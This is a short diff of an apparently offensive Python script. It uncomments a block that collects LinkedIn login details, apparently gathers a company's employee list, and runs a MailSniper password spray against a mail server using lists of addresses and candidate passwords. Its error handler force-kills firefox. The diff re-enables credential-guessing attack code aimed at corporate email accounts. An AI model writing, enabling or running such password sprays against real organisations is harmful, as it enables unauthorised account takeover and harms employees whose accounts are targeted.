@@ -225,7 +225,7 @@ def get_employees(username, password, company_id):
 
 try:
     setup_env()
-    """
+    
     print("Enter your linkedin information...")
     username = input('Enter your email: ')
     password = getpass.getpass('Enter your password: ')
@@ -275,7 +275,7 @@ try:
     
     print("Exec password spray.")
     mailsniper_passwordspray(server, valid_password, "modified_address_list.txt", "valid_passwords_part2.txt")
-    """
+    
 except Exception as e:
     print('Exception has occurred!', e)
     os.system("taskkill /F /im firefox.exe")
